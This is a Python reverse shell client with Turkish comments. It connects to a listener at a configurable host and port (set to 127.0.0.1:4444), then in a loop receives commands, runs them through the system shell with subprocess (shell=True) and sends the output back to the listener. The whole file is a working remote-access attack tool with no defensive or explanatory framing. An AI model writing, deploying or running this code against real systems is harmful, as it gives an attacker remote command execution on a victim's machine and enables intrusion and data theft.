import socket
import subprocess
import sys

#-------------------------------------------------------------------------------
# Hedef Bağlantı Bilgileri
# Bağlanılacak dinleyicinin (listener) IP adresi ve portu
#-------------------------------------------------------------------------------
HOST = '127.0.0.1'  # Dinleyici IP veya hostname
PORT = 4444         # Dinleyici portu

#-------------------------------------------------------------------------------
# Soket Oluşturma ve Bağlantı Kurma
#-------------------------------------------------------------------------------
try:
    # Bir TCP soket nesnesi oluştur
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(f"[+] Soket oluşturuldu. {HOST}:{PORT} adresine bağlanılıyor...")

    # Belirtilen IP adresine ve porta bağlan
    client.connect((HOST, PORT))
    print(f"[+] {HOST}:{PORT} adresine başarıyla bağlanıldı.")

# Bağlantı sırasında oluşabilecek hataları yakala
except socket.error as e:
    print(f"[-] Bağlantı hatası: {e}")
    sys.exit(1) # Hata durumunda betiği sonlandır
except Exception as e:
    print(f"[-] Beklenmedik bir hata oluştu: {e}")
    sys.exit(1) # Beklenmedik hata durumunda betiği sonlandır

#-------------------------------------------------------------------------------
# Komut İşleme Döngüsü
# Sunucudan komutları al, çalıştır ve sonuçları geri gönder
#-------------------------------------------------------------------------------
print("[+] Komut bekleyicisi başlatıldı. 'exit' yazarak sonlandırabilirsiniz.")
while True:
    try:
        # Sunucudan veri (komut) al
        data = client.recv(1024)

        # Gelen veri boşsa (bağlantı kesilmiş olabilir), döngüden çık
        if not data:
            print("[-] Sunucu bağlantıyı kapattı veya veri alınamadı.")
            break

        # Gelen bayt verisini metne dönüştür
        command = data.decode('utf-8').strip() # Baş ve sondaki boşlukları temizle
        print(f"[+] Alınan komut: {command}")

        # Eğer komut 'exit' ise döngüden çık
        if command.lower() == 'exit':
            print("[+] 'exit' komutu alındı. Bağlantı kapatılıyor.")
            break

        #-----------------------------------------------------------------------
        # Komutu Çalıştırma
        # subprocess modülü ile komutu sistem kabuğunda çalıştır
        #-----------------------------------------------------------------------
        try:
            # Komutu çalıştır ve çıktısını yakala
            # shell=True: Komutu sistem kabuğu aracılığıyla çalıştırır (dikkatli kullanılmalı)
            # capture_output=True: stdout ve stderr'i yakalar
            process = subprocess.run(command, shell=True, capture_output=True)

            # Komutun çıktısı (stdout ve stderr)
            output_bytes = process.stdout + process.stderr

            # Eğer çıktı yoksa, bir onay mesajı gönder (isteğe bağlı)
            if not output_bytes:
                 output_bytes = b"Komut basariyla calistirildi, cikti yok.\n"


        # Komut çalıştırılırken oluşabilecek hataları yakala (örn: komut bulunamadı)
        except FileNotFoundError:
             output_bytes = f"Hata: Komut bulunamadi: {command}\n".encode('utf-8')
             print(f"[-] Komut bulunamadi: {command}")
        except Exception as e:
             # Diğer olası çalıştırma hatalarını yakala
             output_bytes = f"Komut calistirilirken hata olustu: {e}\n".encode('utf-8')
             print(f"[-] Komut calistirilirken hata olustu: {e}")

        #-----------------------------------------------------------------------
        # Çıktıyı Geri Gönderme
        # Çalıştırılan komutun çıktısını sunucuya geri gönder
        #-----------------------------------------------------------------------
        client.send(output_bytes)
        print(f"[+] Komut çıktısı ({len(output_bytes)} bayt) gönderildi.")

    # Döngü sırasında oluşabilecek ağ hatalarını yakala
    except socket.error as e:
        print(f"[-] Ağ hatası oluştu: {e}")
        break # Hata durumunda döngüden çık
    except Exception as e:
        # Döngü içindeki diğer beklenmedik hataları yakala
        print(f"[-] Döngü sırasında beklenmedik bir hata oluştu: {e}")
        # Hata olursa döngüyü kırmadan devam etmeyi tercih edebiliriz, ya da durdurabiliriz.
        # break # Ciddi hatalarda döngüden çıkmak için bu yorumu kaldırın.
        pass # Devam etmek için pass kullanıyoruz.


#-------------------------------------------------------------------------------
# Bağlantıyı Kapatma
# Döngü bittiğinde soket bağlantısını kapat
#-------------------------------------------------------------------------------
print("[-] Bağlantı kapatılıyor.")
client.close()
print("[-] Betik sonlandırıldı.")
